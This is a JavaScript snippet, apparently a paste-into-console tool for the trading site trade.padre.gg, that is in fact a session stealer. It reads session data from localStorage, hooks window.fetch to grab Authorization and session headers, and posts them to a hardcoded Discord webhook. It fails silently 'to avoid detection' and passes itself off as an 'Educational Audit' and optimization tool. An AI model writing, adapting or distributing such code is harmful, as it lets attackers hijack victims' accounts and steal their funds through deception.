(async function() {
    // 1. CONFIGURATION
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1469038806681256071/PB2evnQlWcslXIglcXYSwyGnNYG6XcP9qeJzCkUfNIjJAx4YAg5RyyMtKRGQdi1eW2RT", // The destination
        targetDomain: "trade.padre.gg",
        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
    };

    // 2. DISCORD EXFILTRATION FUNCTION
    const sendToDiscord = async (title, description, color = 0x00ff88) => {
        const payload = {
            embeds: [{
                title: title,
                description: description,
                color: color,
                timestamp: new Date().toISOString(),
                footer: { text: "Vanta Tracker | Educational Audit" }
            }]
        };

        await fetch(CONFIG.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {}); // Silent fail to avoid detection
    };

    // 3. TARGET VALIDATION
    if (location.hostname !== CONFIG.targetDomain) {
        alert("Please run this tool on " + CONFIG.targetDomain);
        return;
    }

    // 4. THE "HARVEST" LOGIC
    const session = localStorage.getItem('padreV2-session');
    const bundles = localStorage.getItem('padre-v2-bundles-store-v2');

    if (!session || !bundles) {
        alert("Error: Active session not found. Please log in first.");
        return;
    }

    // Notify that the script has successfully attached
    await sendToDiscord("📡 AUDITOR INITIALIZED", `Target: ${location.hostname}\nSession detected.`);

    // 5. THE HIJACK (Monitoring Network Traffic)
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const response = await originalFetch(...args);
        const headers = args[1]?.headers || {};

        // Look for the specific keys needed for decryption
        const authHeader = headers['Authorization'] || headers['authorization'];
        const sessionHeader = headers['X-Padre-Session'] || headers['x-padre-session'];

        if (authHeader && sessionHeader && !window.vantaCaptureDone) {
            window.vantaCaptureDone = true; // Only run once
            
            // Send captured headers to Discord
            await sendToDiscord("🔓 KEYS CAPTURED", 
                `**Auth:** \`${authHeader.substring(0, 20)}...\`\n**Session:** \`${sessionHeader}\``);
        }

        return response;
    };

    console.log("Vanta: Optimization Nodes Connected.");
})();
